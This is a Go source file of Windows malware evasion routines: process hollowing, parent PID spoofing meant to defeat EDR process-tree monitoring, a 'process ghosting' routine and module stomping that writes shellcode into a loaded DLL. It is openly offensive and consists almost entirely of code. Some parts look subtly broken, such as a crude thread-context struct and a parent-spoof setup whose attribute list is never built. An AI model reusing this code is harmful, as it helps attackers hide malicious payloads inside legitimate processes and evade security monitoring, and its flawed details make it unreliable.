//go:build windows

package evasion

import (
	"fmt"
	"syscall"
	"time"
	"unsafe"
)

// ProcessHollowing injects a payload into a legitimate process.
// The host process is created in suspended state, its memory is replaced with the payload,
// and then the thread is resumed to execute the payload.
func ProcessHollowing(hostProcess string, payload []byte) error {
	appName, _ := syscall.UTF16PtrFromString(hostProcess)
	cmdLine, _ := syscall.UTF16PtrFromString(hostProcess)

	var si StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi ProcessInfo

	// 1. Create suspended process
	ret, _, err := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(appName)),
		uintptr(unsafe.Pointer(cmdLine)),
		0, 0, 0,
		CREATE_SUSPENDED,
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcessW: %v", err)
	}
	defer syscall.CloseHandle(pi.Process)
	defer syscall.CloseHandle(pi.Thread)

	// 2. Parse PE
	imageBase := parsePEImageBase(payload)
	entryPoint := parsePEEntryPoint(payload)

	// 3. Unmap original
	procNtUnmapViewOfSection.Call(
		uintptr(pi.Process),
		uintptr(imageBase),
	)

	// 4. Allocate memory for payload
	remoteBase, _, _ := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		uintptr(imageBase),
		uintptr(len(payload)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)

	// 5. Write payload
	var written uint32
	procWriteProcessMemory.Call(
		uintptr(pi.Process),
		remoteBase,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)),
		uintptr(unsafe.Pointer(&written)),
	)

	// 6. Patch entry point
	var ctx struct {
		ContextFlags uint32
		_            [116]byte
		Rax          uint64
		Rip          uint64
	}

	ctx.ContextFlags = CONTEXT_FULL
	procGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))

	ctx.Rip = uint64(imageBase) + uint64(entryPoint)
	procSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))

	// 7. Resume thread
	procResumeThread.Call(uintptr(pi.Thread))

	return nil
}

// ParentPIDSpoof creates a process with a spoofed parent PID.
// This breaks the process tree relationship that EDRs monitor.
func ParentPIDSpoof(targetProcess string, parentPID uint32, payload []byte) error {
	// Open parent process
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	openProcess := kernel32.NewProc("OpenProcess")

	hParent, _, err := openProcess.Call(
		uintptr(PROCESS_ALL_ACCESS),
		0,
		uintptr(parentPID),
	)
	if hParent == 0 {
		return fmt.Errorf("OpenProcess(%d): %v", parentPID, err)
	}
	defer syscall.CloseHandle(syscall.Handle(hParent))

	// Create process with extended startup info
	var siEx struct {
		cb              uint32
		_               [44]byte
		flags           uint32
		showWindow      uint16
		_               [18]byte
		stdOutput       syscall.Handle
		stdError        syscall.Handle
		stdInput        syscall.Handle
		_               [8]byte
		parentProcess   syscall.Handle
		attributeList   uintptr
	}

	siEx.cb = uint32(unsafe.Sizeof(siEx))
	siEx.flags = EXTENDED_STARTUPINFO_PRESENT
	siEx.parentProcess = syscall.Handle(hParent)

	var pi ProcessInfo

	appName, _ := syscall.UTF16PtrFromString(targetProcess)
	cmdLine, _ := syscall.UTF16PtrFromString(targetProcess)

	ret, _, err := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(appName)),
		uintptr(unsafe.Pointer(cmdLine)),
		0, 0, 0,
		CREATE_SUSPENDED|EXTENDED_STARTUPINFO_PRESENT,
		0, 0,
		uintptr(unsafe.Pointer(&siEx)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcessW with spoofed parent: %v", err)
	}
	defer syscall.CloseHandle(pi.Process)
	defer syscall.CloseHandle(pi.Thread)

	// If payload provided, hollow the process
	if len(payload) > 0 {
		imageBase := parsePEImageBase(payload)
		entryPoint := parsePEEntryPoint(payload)

		procNtUnmapViewOfSection.Call(uintptr(pi.Process), uintptr(imageBase))

		remoteBase, _, _ := procVirtualAllocEx.Call(
			uintptr(pi.Process),
			uintptr(imageBase),
			uintptr(len(payload)),
			MEM_COMMIT|MEM_RESERVE,
			PAGE_EXECUTE_READWRITE,
		)

		var written uint32
		procWriteProcessMemory.Call(
			uintptr(pi.Process),
			remoteBase,
			uintptr(unsafe.Pointer(&payload[0])),
			uintptr(len(payload)),
			uintptr(unsafe.Pointer(&written)),
		)

		var ctx struct {
			ContextFlags uint32
			_            [116]byte
			Rax          uint64
			Rip          uint64
		}

		ctx.ContextFlags = CONTEXT_FULL
		procGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
		ctx.Rip = uint64(imageBase) + uint64(entryPoint)
		procSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	}

	procResumeThread.Call(uintptr(pi.Thread))

	return nil
}

// ProcessGhosting creates a process from a file that is immediately deleted.
// The process runs from memory only, leaving no file on disk.
func ProcessGhosting(payload []byte, targetProcess string) error {
	// 1. Create temporary file
	tempDir, _ := syscall.Getenv("TEMP")
	if tempDir == "" {
		tempDir = `C:\Windows\Temp`
	}

	tempFile := fmt.Sprintf(`%s\%d.tmp`, tempDir, uint32(time.Now().UnixNano()))

	// 2. Write payload
	handle, err := syscall.CreateFile(
		syscall.StringToUTF16Ptr(tempFile),
		syscall.GENERIC_WRITE|syscall.GENERIC_READ,
		syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE|syscall.FILE_SHARE_DELETE,
		nil,
		syscall.CREATE_ALWAYS,
		syscall.FILE_ATTRIBUTE_NORMAL|0x04000000, // FILE_FLAG_DELETE_ON_CLOSE
		0,
	)
	if err != nil {
		return fmt.Errorf("create temp file: %v", err)
	}

	var written uint32
	syscall.WriteFile(handle, payload, &written, nil)

	// 3. Create process from file (still exists but marked for deletion)
	appName, _ := syscall.UTF16PtrFromString(tempFile)
	cmdLine, _ := syscall.UTF16PtrFromString(tempFile)

	var si StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi ProcessInfo

	ret, _, err := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(appName)),
		uintptr(unsafe.Pointer(cmdLine)),
		0, 0, 0,
		CREATE_SUSPENDED,
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		syscall.CloseHandle(handle)
		return fmt.Errorf("CreateProcessW for ghosting: %v", err)
	}

	// 4. Close handle - file is deleted but process continues running
	syscall.CloseHandle(handle)

	// 5. Resume thread
	procResumeThread.Call(uintptr(pi.Thread))

	return nil
}

// ModuleStomping overwrites a loaded DLL's .text section with shellcode.
func ModuleStomping(dllName string, shellcode []byte) error {
	handle, err := syscall.LoadLibrary(dllName)
	if err != nil {
		return fmt.Errorf("load DLL: %v", err)
	}

	base := uintptr(unsafe.Pointer(handle))
	textSection := findTextSection(base)

	var oldProtect uint32
	procVirtualProtect.Call(
		textSection,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	var written uint32
	procWriteProcessMemory.Call(
		uintptr(0xFFFFFFFFFFFFFFFF),
		textSection,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)

	procVirtualProtect.Call(
		textSection,
		uintptr(len(shellcode)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	return nil
}

// Constants for process creation
const (
	EXTENDED_STARTUPINFO_PRESENT = 0x00080000
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
	PAGE_READWRITE = 0x04
)
